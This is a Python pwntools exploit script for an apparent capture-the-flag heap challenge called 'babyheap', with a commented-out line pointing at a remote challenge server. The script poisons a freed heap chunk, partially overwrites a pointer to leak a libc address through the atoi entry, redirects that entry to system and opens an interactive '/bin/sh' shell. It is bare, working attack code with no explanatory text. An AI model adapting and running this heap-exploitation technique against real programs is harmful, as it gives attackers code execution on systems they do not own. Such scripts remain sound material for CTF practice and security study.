from pwn import *
context.log_level='debug'
def new():
  p.sendlineafter("> ","1")

def edit(note):
  p.sendlineafter("> ","2")
  p.sendafter("Content? ",note)

def delete():
  p.sendlineafter("> ","4")

def  show():
  p.sendlineafter("> ","3")
  p.recvuntil("Content: ")
  return p.recvuntil("\n")

def  fill(note):
  p.sendlineafter("> ","1337")
  p.sendafter("Fill ",note)

p=process("./babyheap")
elf = ELF("./babyheap")
libc = ELF("./libc.so.6")
#pp=remote("35.243.188.20",2000)

new()
delete()
edit(p64(0x602095-8))
new()
fill('/bin/sh'+chr(0)+'a'*0x33+p64(0x602060)[0:3])
#gdb.attach(p)
p.sendline('3')
p.recvuntil('Content: ')
libc_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-libc.plt['atoi']
print "libc_addr : " + hex(libc_addr)
#gdb.attach(p)
system_addr = libc_addr + libc.plt['system']

edit(p64(system_addr))
p.sendline('/bin/sh')
p.interactive()
